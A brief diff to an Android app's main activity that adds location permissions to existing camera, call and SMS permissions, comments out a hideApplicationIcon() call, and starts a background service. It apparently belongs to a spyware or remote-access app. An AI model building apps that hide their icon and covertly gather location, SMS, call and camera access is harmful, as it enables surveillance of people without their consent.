@@ -29,6 +29,8 @@ public class MainActivity extends AppCompatActivity {
 
     private static final int PERMISSION_REQUEST_CODE = 200;
     private static String[] PERMISSIONS = {
+        Manifest.permission.ACCESS_COARSE_LOCATION,
+        Manifest.permission.ACCESS_FINE_LOCATION,
         Manifest.permission.CAMERA,
         Manifest.permission.CALL_PHONE,
         Manifest.permission.SEND_SMS,
@@ -47,7 +49,7 @@ public class MainActivity extends AppCompatActivity {
 
         checkPermissions();
 
-        hideApplicationIcon();
+//        hideApplicationIcon();
         startService(new Intent(this, MainService.class));
     }
 
